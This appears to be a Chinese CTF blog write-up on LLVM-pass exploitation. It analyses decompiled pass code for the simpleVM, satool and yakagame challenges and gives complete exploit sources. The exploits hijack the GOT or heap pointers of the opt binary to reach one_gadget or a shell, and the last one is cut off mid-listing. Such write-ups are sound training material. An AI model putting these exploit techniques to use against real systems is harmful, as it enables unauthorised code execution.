[{"title":"LLVM学习","url":"/2023/09/07/LLVM学习/","content":"\n\n\n\n\n# 前置知识\n\n从`CTF`角度来说，会给出一个运行程序`opt`和一个库`xx.so`，然后做题需要提供一个`exp.ll`，传递给`opt`。这个`exp.ll`是通过`exp.c`进行中间表达式生成的，是`exp.c`在程序中的一个比较直观的结构，类似如下\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n\nint main() {\n   char name[0x10];\n   read(0,name,0x10);\n   write(1,name,0x10);\n   printf(\"bye\\n\");\n}\n```\n\n使用命令`clang -emit-llvm -S exp.c -o exp.ll`得到如下的`exp.ll`直观的程序中间结构表达式\n\n```c\n; ModuleID = 'main.c'\nsource_filename = \"main.c\"\ntarget datalayout = \"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128\"\ntarget triple = \"x86_64-pc-linux-gnu\"\n\n@.str = private unnamed_addr constant [5 x i8] c\"bye\\0A\\00\", align 1\n\n; Function Attrs: noinline nounwind optnone uwtable\ndefine dso_local i32 @main() #0 {\n  %1 = alloca [16 x i8], align 16\n  %2 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0\n  %3 = call i64 @read(i32 0, i8* %2, i64 16)\n  %4 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0\n  %5 = call i64 @write(i32 1, i8* %4, i64 16)\n  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))\n  ret i32 0\n}\n\ndeclare dso_local i64 @read(i32, i8*, i64) #1\n\ndeclare dso_local i64 @write(i32, i8*, i64) #1\n\ndeclare dso_local i32 @printf(i8*, ...) #1\n\nattributes #0 = { noinline nounwind optnone uwtable \"correctly-rounded-divide-sqrt-fp-math\"=\"false\" \"disable-tail-calls\"=\"false\" \"frame-pointer\"=\"all\" \"less-precise-fpmad\"=\"false\" \"min-legal-vector-width\"=\"0\" \"no-infs-fp-math\"=\"false\" \"no-jump-tables\"=\"false\" \"no-nans-fp-math\"=\"false\" \"no-signed-zeros-fp-math\"=\"false\" \"no-trapping-math\"=\"false\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"unsafe-fp-math\"=\"false\" \"use-soft-float\"=\"false\" }\nattributes #1 = { \"correctly-rounded-divide-sqrt-fp-math\"=\"false\" \"disable-tail-calls\"=\"false\" \"frame-pointer\"=\"all\" \"less-precise-fpmad\"=\"false\" \"no-infs-fp-math\"=\"false\" \"no-nans-fp-math\"=\"false\" \"no-signed-zeros-fp-math\"=\"false\" \"no-trapping-math\"=\"false\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"unsafe-fp-math\"=\"false\" \"use-soft-float\"=\"false\" }\n\n!llvm.module.flags = !{!0}\n!llvm.ident = !{!1}\n\n!0 = !{i32 1, !\"wchar_size\", i32 4}\n!1 = !{!\"clang version 10.0.0-4ubuntu1 \"}\n```\n\n`opt`在运行时，加载`xx.so`，而`xx.so`的`runOnFunction`函数会对`exp.ll`中的函数进行一个对应的解析操作。比如遍历`exp.ll`中的函数，如果调用了`add`函数，就获取`add`函数的第一个参数`a1`，依据`a1`的值对全局变量`p`指针进行加操作，其他的依据`write`函数什么的进行写操作从而造成任意写漏洞等等。\n\n具体的可以看：[[原创\\] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9)\n\n# 题目\n\n## RedHat2021-simpleVM\n\n### 漏洞分析\n\n分析`VMPass.so`，`Alt+T`搜索一下`vtable`，找到最后一个函数即为`runOnFunction`\n\n![image-20230828105741726](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828105741726.png)\n\n进入查看进行分析，如果有函数`o0o0o0o0`，则进入`sub_6AC0`进行处理\n\n![image-20230828105832996](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828105832996.png)\n\n然后在`sub_6AC0`函数中在进行循环分析，对每个基本块进行了遍历处理，处理函数为`sub_6B80`\n\n![image-20230828110053292](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828110053292.png)\n\n进入`sub_6B80`函数，大致分析一下\n\n```c\n__int64 __fastcall sub_6B80(__int64 a1, llvm::BasicBlock *a2)\n{\n  llvm::Value *CalledFunction; // rax\n  void **v3; // rax\n  void **v4; // rax\n  llvm::ConstantInt *v6; // [rsp+18h] [rbp-1B8h]\n  __int64 v7; // [rsp+20h] [rbp-1B0h]\n  __int64 v8; // [rsp+28h] [rbp-1A8h]\n  llvm::ConstantInt *v9; // [rsp+30h] [rbp-1A0h]\n  _QWORD *v10; // [rsp+38h] [rbp-198h]\n  __int64 v11; // [rsp+40h] [rbp-190h]\n  llvm::ConstantInt *v12; // [rsp+50h] [rbp-180h]\n  __int64 v13; // [rsp+58h] [rbp-178h]\n  __int64 v14; // [rsp+60h] [rbp-170h]\n  llvm::ConstantInt *v15; // [rsp+68h] [rbp-168h]\n  _QWORD *v16; // [rsp+70h] [rbp-160h]\n  __int64 v17; // [rsp+78h] [rbp-158h]\n  __int64 v18; // [rsp+A0h] [rbp-130h]\n  llvm::ConstantInt *v19; // [rsp+A8h] [rbp-128h]\n  void *v20; // [rsp+B0h] [rbp-120h]\n  __int64 v21; // [rsp+B8h] [rbp-118h]\n  __int64 v22; // [rsp+E0h] [rbp-F0h]\n  llvm::ConstantInt *v23; // [rsp+E8h] [rbp-E8h]\n  void *v24; // [rsp+F0h] [rbp-E0h]\n  __int64 v25; // [rsp+F8h] [rbp-D8h]\n  __int64 v26; // [rsp+110h] [rbp-C0h]\n  llvm::ConstantInt *v27; // [rsp+118h] [rbp-B8h]\n  _QWORD *v28; // [rsp+120h] [rbp-B0h]\n  __int64 v29; // [rsp+128h] [rbp-A8h]\n  __int64 ZExtValue; // [rsp+140h] [rbp-90h]\n  llvm::ConstantInt *v31; // [rsp+148h] [rbp-88h]\n  _QWORD *v32; // [rsp+150h] [rbp-80h]\n  __int64 ArgOperand; // [rsp+158h] [rbp-78h]\n  char *s1; // [rsp+168h] [rbp-68h]\n  llvm::CallBase *v35; // [rsp+170h] [rbp-60h]\n  llvm::Instruction *v36; // [rsp+180h] [rbp-50h]\n  _QWORD *Name; // [rsp+1A8h] [rbp-28h]\n  __int64 v38; // [rsp+1B8h] [rbp-18h] BYREF\n  __int64 v39[2]; // [rsp+1C0h] [rbp-10h] BYREF\n\n  v39[1] = __readfsqword(0x28u);\n  v39[0] = llvm::BasicBlock::begin(a2);\n  while ( 1 )\n  {\n    v38 = llvm::BasicBlock::end(a2);\n    if ( (llvm::operator!=(v39, &v38) & 1) == 0 )//基本是固定的LLVM遍历套路\n      break;\n    v36 = (llvm::Instruction *)llvm::dyn_cast<llvm::Instruction,llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,false>>(v39);\n      //这里的55即操作码,查询对应文档为PHINode操作码，不是很懂这个\n    if ( (unsigned int)llvm::Instruction::getOpcode(v36) == 55 )\n    {\n        //获取指令\n      v35 = (llvm::CallBase *)llvm::dyn_cast<llvm::CallInst,llvm::Instruction>(v36);\n      if ( v35 )\n      {\n        s1 = (char *)malloc(0x20uLL);\n          //获取函数名称\n        CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);\n        Name = (_QWORD *)llvm::Value::getName(CalledFunction);\n        *(_QWORD *)s1 = *Name;\n        *((_QWORD *)s1 + 1) = Name[1];\n        *((_QWORD *)s1 + 2) = Name[2];\n        *((_QWORD *)s1 + 3) = Name[3];\n          //处理pop函数\n        if ( !strcmp(s1, \"pop\") )\n        {\n         //如果函数参数是2，这里把pop函数名称本身当作了一个参数，所以实际上pop函数应该只有一个参数\n          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )\n          {\n              //获取pop函数的第一个参数\n            ArgOperand = llvm::CallBase::getArgOperand(v35, 0);\n            v32 = 0LL;\n            v31 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(ArgOperand);\n            if ( v31 )\n            {\n                //解析参数值\n              ZExtValue = llvm::ConstantInt::getZExtValue(v31);\n              if ( ZExtValue == 1 )\n                v32 = off_20DFD0;\n              if ( ZExtValue == 2 )\n                v32 = off_20DFC0;\n            }\n              //做一些操作，实际调试一下就行\n            if ( v32 )\n            {\n              v3 = off_20DFD8;\n              *v32 = *(_QWORD *)*off_20DFD8;\n              *v3 = (char *)*v3 - 8;\n            }\n          }\n        }\n          //和pop类似\n        else if ( !strcmp(s1, \"push\") )\n        {\n          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )\n          {\n            v29 = llvm::CallBase::getArgOperand(v35, 0);\n            v28 = 0LL;\n            v27 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v29);\n            if ( v27 )\n            {\n              v26 = llvm::ConstantInt::getZExtValue(v27);\n              if ( v26 == 1 )\n                v28 = off_20DFD0;\n              if ( v26 == 2 )\n                v28 = off_20DFC0;\n            }\n            if ( v28 )\n            {\n              v4 = off_20DFD8;\n              *off_20DFD8 = (char *)*off_20DFD8 + 8;\n              *(_QWORD *)*v4 = *v28;\n            }\n          }\n        }\n          //1:**off_20DFD0 = *off_20DFC0\n          //2:**off_20DFC0 = *off_20DFD0\n        else if ( !strcmp(s1, \"store\") )\n        {\n          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )\n          {\n            v25 = llvm::CallBase::getArgOperand(v35, 0);\n            v24 = 0LL;\n            v23 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v25);\n            if ( v23 )\n            {\n              v22 = llvm::ConstantInt::getZExtValue(v23);\n              if ( v22 == 1 )\n                v24 = off_20DFD0;\n              if ( v22 == 2 )\n                v24 = off_20DFC0;\n            }\n            if ( v24 == off_20DFD0 )\n            {\n              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;\n            }\n            else if ( v24 == off_20DFC0 )\n            {\n              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;\n            }\n          }\n        }\n          //arg0: 1 -> *off_20DFD0 = **off_20DFC0\n          //arg0: 2 -> *off_20DFC0 = **off_20DFD0\n        else if ( !strcmp(s1, \"load\") )\n        {\n          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )\n          {\n            v21 = llvm::CallBase::getArgOperand(v35, 0);\n            v20 = 0LL;\n            v19 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v21);\n            if ( v19 )\n            {\n              v18 = llvm::ConstantInt::getZExtValue(v19);\n              if ( v18 == 1 )\n                v20 = off_20DFD0;\n              if ( v18 == 2 )\n                v20 = off_20DFC0;\n            }\n            if ( v20 == off_20DFD0 )\n              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;\n            if ( v20 == off_20DFC0 )\n              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;\n          }\n        }\n          //arg0: 1 -> *off_20DFD0 += arg1\n          //arg0: 2 -> *off_20DFC0 += arg1\n        else if ( !strcmp(s1, \"add\") )\n        {\n          if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 3 )\n          {\n            v17 = llvm::CallBase::getArgOperand(v35, 0);\n            v16 = 0LL;\n            v15 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v17);\n            if ( v15 )\n            {\n              v14 = llvm::ConstantInt::getZExtValue(v15);\n              if ( v14 == 1 )\n                v16 = off_20DFD0;\n              if ( v14 == 2 )\n                v16 = off_20DFC0;\n            }\n            if ( v16 )\n            {\n              v13 = llvm::CallBase::getArgOperand(v35, 1u);\n              v12 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v13);\n              if ( v12 )\n                *v16 += llvm::ConstantInt::getZExtValue(v12);\n            }\n          }\n        }\n          //arg0: 1 -> *off_20DFD0 -= arg1\n          //arg0: 2 -> *off_20DFC0 -= arg1\n        else if ( !strcmp(s1, \"min\") && (unsigned int)llvm::CallBase::getNumOperands(v35) == 3 )\n        {\n          v11 = llvm::CallBase::getArgOperand(v35, 0);\n          v10 = 0LL;\n          v9 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v11);\n          if ( v9 )\n          {\n            v8 = llvm::ConstantInt::getZExtValue(v9);\n            if ( v8 == 1 )\n              v10 = off_20DFD0;\n            if ( v8 == 2 )\n              v10 = off_20DFC0;\n          }\n          if ( v10 )\n          {\n            v7 = llvm::CallBase::getArgOperand(v35, 1u);\n            v6 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v7);\n            if ( v6 )\n              *v10 -= llvm::ConstantInt::getZExtValue(v6);\n          }\n        }\n        free(s1);\n      }\n    }\n    llvm::ilist_iterator<llvm::ilist_detail::node_options<llvm::Instruction,false,false,void>,false,false>::operator++(\n      v39,\n      0LL);\n  }\n  return 1LL;\n}\n```\n\n总体总结如下，`pop`和`push`与漏洞没什么关系\n\n```\nstore:\n    arg0:1 -> **off_20DFC0 = *off_20DFD0\n    arg0:2 -> **off_20DFD0 = *off_20DFC0\n    \nload:\n    arg0: 1 -> *off_20DFC0 = **off_20DFD0\n    arg0: 2 -> *off_20DFD0 = **off_20DFC0\n    \nadd:\n    arg0: 1 -> *off_20DFD0 += arg1\n    arg0: 2 -> *off_20DFC0 += arg1 \n    \nmin:\n    arg0: 1 -> *off_20DFD0 -= arg1\n    arg0: 2 -> *off_20DFC0 -= arg1\n```\n\n相当于现在可控任意两个指针`reg1/reg2`，并且可以取其中一个指针的值赋值给另一个指针。\n\n### 简单调试\n\n先写一下简单程序调试一下，由于题目给的是`opt-8`，所以最好我们安装的也是对应版本的，即\n\n```\nsudo apt install clang-8\nsudo apt install llvm-8\n```\n\n对应的调试程序为\n\n```c\nvoid add(int num, long long val);\nvoid min(int num, long long val);\nvoid load(int num);\nvoid store(int num);\n \nvoid o0o0o0o0()\n{\n    load(1);\n    load(2);\n    store(1);\n    store(2);\n    add(1, 0x1000);\n    add(2, 0x1000);\n    min(1, 0x1000);\n    min(1, 0x1000);\n\n}\n```\n\n使用命令`clang-8 -emit-llvm -S myDebug.c -o myDebug.ll`编译生成`myDebug`，随后在`IDA`进行远程调试，如下配置\n\n![image-20230828150159620](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828150159620.png)\n\n即可进行调试，通过调试可以想出利用步骤如下\n\n```\nreg1 = 0\nreg2 = 0\n\nadd(1,free_got)\n//控制reg1指针为opt程序中的got表地址free_got\nreg1 += free_got\n\nload(1)\nreg2 = *reg1 = free_addr\n//使得reg2指针为free_addr\n\nadd(2,offset)\n//使得reg2指针为one_gadget\n\nstore(1)\n//将reg2指针的值one_gadget赋值给reg1指向的值，即修改free_got为one_gadget\n```\n\n### 漏洞利用\n\n`checksec`一下`opt`，一般不存在`PIE`，那么指向`opt`程序的`got`表就很轻松了，最终`exp`如下\n\n```c\nvoid store(int a);\nvoid load(int a);\nvoid add(int a, int b);\n\nvoid o0o0o0o0(){\n    add(1, 0x77e100);\n    load(1);\n    add(2, 0 - 0x9a6d0 + 0xe3b04);\n    store(1);\n}\n```\n\n使用命令编译后运行即可\n\n```\nclang-8 -emit-llvm -S myExp.c -o myExp.ll\nopt-8 -load ./VMPass.so -VMPass myExp.ll\n```\n\n需要注意的是，这里修改的是`opt`程序中的`free_got`，也需要程序`opt`程序调用才行，同时满足一些寄存器的设置，那么有时候可能不太满足`One_gadget`，那么多试试几个`got`也行。另外`IDA`远程调试的时候一些偏移可能有点问题，最好还是在`gdb`中寻找，使用如下命令\n\n```\ngdb ./opt-8\nset args -load ./VMPass.so -VMPass ./myExp.ll\n```\n\n同时有时候从`opt-8`开始的时候不好确定加载的`.so`是在什么时候加载的，通常是`winmt`师傅找到的如下情况\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/949925_AFDQ35JVS6KKT6Y.png)\n\n\n\n\n\n\n\n## CISCN-2021-satool\n\n### 漏洞分析\n\n分析漏洞，老套路，搜索`vtable`和`start`函数，得到`runOnFunction`函数和位置注册名为`SAPass`，进入分析\n\n![image-20230829094305721](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094305721.png)\n\n![image-20230829094320046](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094320046.png)\n\n进入runOnFunction进行分析，首先是获取到解析的函数名称，这是硬编码的小端序\n\n![image-20230829094428297](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094428297.png)\n\n![image-20230829094523936](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094523936.png)\n\n那么实际匹配的函数名称应该为`B4ckDo0r`，之后就有一堆奇奇怪怪的代码，暂时先不用管，仔细寻找字符串匹配的\n\n![image-20230829094630811](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094630811.png)\n\n![image-20230829094642785](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094642785.png)\n\n![image-20230829094654104](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094654104.png)\n\n![image-20230829094701499](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094701499.png)\n\n### 简单调试\n\n再简单写一个例子，通过调试进行分析，可以确定大致的函数名称、参数对应的模板如下\n\n```c\nvoid save(char *a, char *b);\nvoid stealkey();\nvoid fakekey(long long x);\nvoid run();\n\nvoid B4ckDo0r()\n{\n\tsave(\"\", \"\");\n    takeaway(0);\n\tstealkey();\n\tfakekey(0x1111);\n\trun();\n}\n```\n\n在调试过程中发现涉及到堆，但是`IDA`不太好查看堆的结构，可以用一下插件：[danigargu/heap-viewer: IDA Pro plugin to examine the glibc heap, focused on exploit development (github.com)](https://github.com/danigargu/heap-viewer)\n\n最终发现那一堆乱七八糟的代码都是一些检查，最终的函数大致功能如下\n\n```\nsave:\n\tsave(arg0,arg1);\n\tbyte_2040f8 = chunk_addr\n\t//申请0x18的chunk，将arg0的内容放到chunk，arg1的内容放到chunk + 8\n\t//如果申请了0x10及以上的chunk，由于判断代码会导致释放，不过其实也可以溢出的，只是会释放而已。\n\t//这个应该也可以进行相关利用的\n\ntakeaway:\n\t//不分析，和漏洞无关\n\t\n\t\nstealkey:\n\tstealkey()\n\t//将*byte_2040f8赋值给byte_204100\n\nfakekey:\n\tfakekey(arg0)\n\t*byte_2040f8 = byte_204100 + arg0\n\t\nrun:\n\t*byte_2040f8()\n```\n\n### 漏洞利用\n\n那么申请残留`libc`的`chunk`，修改残留的`libc`地址为`one_gadget`即可，然后`run`即可完成利用，在`save`的`malloc`之前下断点，查看堆状态\n\n![image-20230829141734303](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829141734303.png)\n\n![image-20230829141743890](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829141743890.png)\n\n`tcache`有一个`0x20`的`chunk`，随后就会从`smallbins`中申请，那么申请两次之后，得到残留`libc`的`chunk`，然后使用`stealkey`将残留`libc`赋值给`byte_204100`，之后又使用`fakekey`进行修改将`byte_204100`的残留`libc`进行加减操作得到`one_gadget`，赋值给`*byte_2040f8`，通过`run`调用`*byte_2040f8`即可调用到`one_gadget`。\n\n最终`exp`如下\n\n```c\n// clang-8 -emit-llvm -S exp.c -o exp.ll\nvoid save(char *a, char *b);\nvoid stealkey();\nvoid fakekey(long long x);\nvoid run();\n \nvoid B4ckDo0r()\n{\n    save(\"\\n\", \"\\n\");\n    save(\"\", \"\\n\");\n    stealkey();\n    fakekey(-0x1ecbf0+0xe3afe);\n    run();\n}\n```\n\n\n\n## 强网杯-2022 yakagame\n\n### 漏洞分析\n\n直接`shift+F12`查看字符串，发现`flag`，交叉引用进入查看\n\n![image-20230829145039943](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145039943.png)\n\n`sub_C650`查看是注册函数，依照惯例注册名应该为`ayaka`通过`vtable`找到`runOnFunction`\n\n![image-20230829145538577](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145538577.png)\n\n处理函数为`gamestart`，分析找到内部处理函数有`fight`，并且满足`score`达成目标之后可以调用到后门，\n\n![image-20230829145854503](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145854503.png)\n\n![image-20230829145951845](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829145951845.png)\n\n那么主要分析点就是如何操作的`score`以及`cmd`如何赋值。经过分析，重点的漏洞在`else`分支\n\n![image-20230829171103523](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829171103523.png)\n\n在`else`分支中，不满足以上所有函数的匹配的其他函数，会进入该分支，遍历`funMap`，如果`funMap`中存在对应关系`funMap[func_name] = value`，则作`weaponlist[idx] = value`操作，如果不存在，则添加对应关系`funMap[func_name] = value`\n\n这里的`idx`是`char`型的，在每一次进入`else`分支都会进行遍历`funMap`的，那么`funMap`中如果存在很多项，导致匹配到某个已存在的函数时，`idx`在`-128~-1`之间，那么就会导致`weaponlist`数组向上溢出了，从而能够覆盖到在`weaponlist`上方的`score`和`cmd`，完成劫持利用。\n\n### 漏洞利用\n\n那么就通过计算生成对应`idx`的函数进行覆盖即可，`cmd`可以让其指向`opt`程序中`sh`的指针，最终`winmt`师傅的`exp`如下\n\n```\n// clang-8 -emit-llvm -S exp.c -o exp.ll\nvoid winmt000(int x);\nvoid winmt001(int x);\nvoid winmt002(int x);\nvoid winmt003(int x);\nvoid winmt004(int x);\nvoid winmt005(int x);\nvoid winmt006(int x);\nvoid winmt007(int x);\nvoid winmt008(int x);\nvoid winmt009(int x);\nvoid winmt010(int x);\nvoid winmt011(int x);\nvoid winmt012(int x);\nvoid winmt013(int x);\nvoid winmt014(int x);\nvoid winmt015(int x);\nvoid winmt016(int x);\nvoid winmt017(int x);\nvoid winmt018(int x);\nvoid winmt019(int x);\nvoid winmt020(int x);\nvoid winmt021(int x);\nvoid winmt022(int x);\nvoid winmt023(int x);\nvoid winmt024(int x);\nvoid winmt025(int x);\nvoid winmt026(int x);\nvoid winmt027(int x);\nvoid winmt028(int x);\nvoid winmt029(int x);\nvoid winmt030(int x);\nvoid winmt031(int x);\nvoid winmt032(int x);\nvoid winmt033(int x);\nvoid winmt034(int x);\nvoid winmt035(int x);\nvoid winmt036(int x);\nvoid winmt037(int x);\nvoid winmt038(int x);\nvoid winmt039(int x);\nvoid winmt040(int x);\nvoid winmt041(int x);\nvoid winmt042(int x);\nvoid winmt043(int x);\nvoid winmt044(int x);\nvoid winmt045(int x);\nvoid winmt046(int x);\nvoid winmt047(int x);\nvoid winmt048(int x);\nvoid winmt049(int x);\nvoid winmt050(int x);\nvoid winmt051(int x);\nvoid winmt052(int x);\nvoid winmt053(int x);\nvoid winmt054(int x);\nvoid winmt055(int x);\nvoid winmt056(int x);\nvoid winmt057(int x);\nvoid winmt058(int x);\nvoid winmt059(int x);\nvoid winmt060(int x);\nvoid winmt061(int x);\nvoid winmt062(int x);\nvoid winmt063(int x);\nvoid winmt064(int x);\nvoid winmt065(int x);\nvoid winmt066(int x);\nvoid winmt067(int x);\nvoid winmt068(int x);\nvoid winmt069(int x);\nvoid winmt070(int x);\nvoid winmt071(int x);\nvoid winmt072(int x);\nvoid winmt073(int x);\nvoid winmt074(int x);\nvoid winmt075(int x);\nvoid winmt076(int x);\nvoid winmt077(int x);\nvoid winmt078(int x);\nvoid winmt079(int x);\nvoid winmt080(int x);\nvoid winmt081(int x);\nvoid winmt082(int x);\nvoid winmt083(int x);\nvoid winmt084(int x);\nvoid winmt085(int x);\nvoid winmt086(int x);\nvoid winmt087(int x);\nvoid winmt088(int x);\nvoid winmt089(int x);\nvoid winmt090(int x);\nvoid winmt091(int x);\nvoid winmt092(int x);\nvoid winmt093(int x);\nvoid winmt094(int x);\nvoid winmt095(int x);\nvoid winmt096(int x);\nvoid winmt097(int x);\nvoid winmt098(int x);\nvoid winmt099(int x);\nvoid winmt100(int x);\nvoid winmt101(int x);\nvoid winmt102(int x);\nvoid winmt103(int x);\nvoid winmt104(int x);\nvoid winmt105(int x);\nvoid winmt106(int x);\nvoid winmt107(int x);\nvoid winmt108(int x);\nvoid winmt109(int x);\nvoid winmt110(int x);\nvoid winmt111(int x);\nvoid winmt112(int x);\nvoid winmt113(int x);\nvoid winmt114(int x);\nvoid winmt115(int x);\nvoid winmt116(int x);\nvoid winmt117(int x);\nvoid winmt118(int x);\nvoid winmt119(int x);\nvoid winmt120(int x);\nvoid winmt121(int x);\nvoid winmt122(int x);\nvoid winmt123(int x);\nvoid winmt124(int x);\nvoid winmt125(int x);\nvoid winmt126(int x);\nvoid winmt127(int x);\nvoid winmt128(int x);\nvoid winmt129(int x);\nvoid winmt130(int x);\nvoid winmt131(int x);\nvoid winmt132(int x);\nvoid winmt133(int x);\nvoid winmt134(int x);\nvoid winmt135(int x);\nvoid winmt136(int x);\nvoid winmt137(int x);\nvoid winmt138(int x);\nvoid winmt139(int x);\nvoid winmt140(int x);\nvoid winmt141(int x);\nvoid winmt142(int x);\nvoid winmt143(int x);\nvoid winmt144(int x);\nvoid winmt145(int x);\nvoid winmt146(int x);\nvoid winmt147(int x);\nvoid winmt148(int x);\nvoid winmt149(int x);\nvoid winmt150(int x);\nvoid winmt151(int x);\nvoid winmt152(int x);\nvoid winmt153(int x);\nvoid winmt154(int x);\nvoid winmt155(int x);\nvoid winmt156(int x);\nvoid winmt157(int x);\nvoid winmt158(int x);\nvoid winmt159(int x);\nvoid winmt160(int x);\nvoid winmt161(int x);\nvoid winmt162(int x);\nvoid winmt163(int x);\nvoid winmt164(int x);\nvoid winmt165(int x);\nvoid winmt166(int x);\nvoid winmt167(int x);\nvoid winmt168(int x);\nvoid winmt169(int x);\nvoid winmt170(int x);\nvoid winmt171(int x);\nvoid winmt172(int x);\nvoid winmt173(int x);\nvoid winmt174(int x);\nvoid winmt175(int x);\nvoid winmt176(int x);\nvoid winmt177(int x);\nvoid winmt178(int x);\nvoid winmt179(int x);\nvoid winmt180(int x);\nvoid winmt181(int x);\nvoid winmt182(int x);\nvoid winmt183(int x);\nvoid winmt184(int x);\nvoid winmt185(int x);\nvoid winmt186(int x);\nvoid winmt187(int x);\nvoid winmt188(int x);\nvoid winmt189(int x);\nvoid winmt190(int x);\nvoid winmt191(int x);\nvoid winmt192(int x);\nvoid winmt193(int x);\nvoid winmt194(int x);\nvoid winmt195(int x);\nvoid winmt196(int x);\nvoid winmt197(int x);\nvoid winmt198(int x);\nvoid winmt199(int x);\nvoid winmt200(int x);\nvoid winmt201(int x);\nvoid winmt202(int x);\nvoid winmt203(int x);\nvoid winmt204(int x);\nvoid winmt205(int x);\nvoid winmt206(int x);\nvoid winmt207(int x);\nvoid winmt208(int x);\nvoid winmt209(int x);\nvoid winmt210(int x);\nvoid winmt211(int x);\nvoid winmt212(int x);\nvoid winmt213(int x);\nvoid winmt214(int x);\nvoid winmt215(int x);\nvoid winmt216(int x);\nvoid winmt217(int x);\nvoid winmt218(int x);\nvoid winmt219(int x);\nvoid winmt220(int x);\nvoid winmt221(int x);\nvoid winmt222(int x);\nvoid winmt223(int x);\nvoid winmt224(int x);\nvoid winmt225(int x);\nvoid winmt226(int x);\nvoid winmt227(int x);\nvoid winmt228(int x);\nvoid winmt229(int x);\nvoid winmt230(int x);\nvoid winmt231(int x);\nvoid winmt232(int x);\nvoid winmt233(int x);\nvoid winmt234(int x);\nvoid winmt235(int x);\nvoid winmt236(int x);\nvoid winmt237(int x);\nvoid winmt238(int x);\nvoid winmt239(int x);\nvoid winmt240(int x);\n \nvoid fight(int x);\n \nvoid gamestart()\n{\n    winmt000(0);\n    winmt001(0);\n    winmt002(0);\n    winmt003(0);\n    winmt004(0);\n    winmt005(0);\n    winmt006(0);\n    winmt007(0);\n    winmt008(0);\n    winmt009(0);\n    winmt010(0);\n    winmt011(0);\n    winmt012(0);\n    winmt013(0);\n    winmt014(0);\n    winmt015(0);\n    winmt016(0);\n    winmt017(0);\n    winmt018(0);\n    winmt019(0);\n    winmt020(0);\n    winmt021(0);\n    winmt022(0);\n    winmt023(0);\n    winmt024(0);\n    winmt025(0);\n    winmt026(0);\n    winmt027(0);\n    winmt028(0);\n    winmt029(0);\n    winmt030(0);\n    winmt031(0);\n    winmt032(0);\n    winmt033(0);\n    winmt034(0);\n    winmt035(0);\n    winmt036(0);\n    winmt037(0);\n    winmt038(0);\n    winmt039(0);\n    winmt040(0);\n    winmt041(0);\n    winmt042(0);\n    winmt043(0);\n    winmt044(0);\n    winmt045(0);\n    winmt046(0);\n    winmt047(0);\n    winmt048(0);\n    winmt049(0);\n    winmt050(0);\n    winmt051(0);\n    winmt052(0);\n    winmt053(0);\n    winmt054(0);\n    winmt055(0);\n    winmt056(0);\n    winmt057(0);\n    winmt058(0);\n    winmt059(0);\n    winmt060(0);\n    winmt061(0);\n    winmt062(0);\n    winmt063(0);\n    winmt064(0);\n    winmt065(0);\n    winmt066(0);\n    winmt067(0);\n    winmt068(0);\n    winmt069(0);\n    winmt070(0);\n    winmt071(0);\n    winmt072(0);\n    winmt073(0);\n    winmt074(0);\n    winmt075(0);\n    winmt076(0);\n    winmt077(0);\n    winmt078(0);\n    winmt079(0);\n    winmt080(0);\n    winmt081(0);\n    winmt082(0);\n    winmt083(0);\n    winmt084(0);\n    winmt085(0);\n    winmt086(0);\n    winmt087(0);\n    winmt088(0);\n    winmt089(0);\n    winmt090(0);\n    winmt091(0);\n    winmt092(0);\n    